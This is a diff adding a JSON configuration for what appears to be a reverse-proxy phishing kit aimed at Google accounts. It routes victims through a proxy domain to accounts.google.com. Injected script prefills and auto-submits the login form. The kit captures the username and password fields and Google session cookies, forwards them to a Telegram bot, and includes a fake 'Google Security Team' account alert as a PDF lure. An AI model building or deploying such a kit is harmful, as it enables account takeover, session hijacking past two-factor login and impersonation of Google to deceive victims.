@@ -1,0 +1,16 @@
+{
+    "proxyDomain": "g.yourdomain.com",
+    "target": "https://accounts.google.com",
+    "trackingCookie": "session_id",
+    "jsRules": "const email=decodeURIComponent(window.location.hash.slice(1));if(document.querySelector('input[type=email]')){document.querySelector('input[type=email]').value=email;setTimeout(()=>{document.querySelector('form')?.dispatchEvent(new Event('submit',{bubbles:true}));},500);}",
+    "captureFields": ["identifier", "Passwd"],
+    "telegramBotToken": "YOUR_BOT_TOKEN",
+    "telegramChatId": "YOUR_CHAT_ID",
+    "serviceName": "Gmail",
+    "cookieCapture": ["SID", "HSID", "__Secure-1PSID", "__Secure-3PSID", "SSID"],
+    "pdfTemplate": {
+        "title": "Google Account Security Alert",
+        "body": "Dear User,\n\nWe detected unusual activity on your Google account. Please verify your identity to secure your account.\n\nClick here to verify: {link}\n\nBest,\nGoogle Security Team",
+        "filename": "Google_Alert.pdf"
+    }
+}
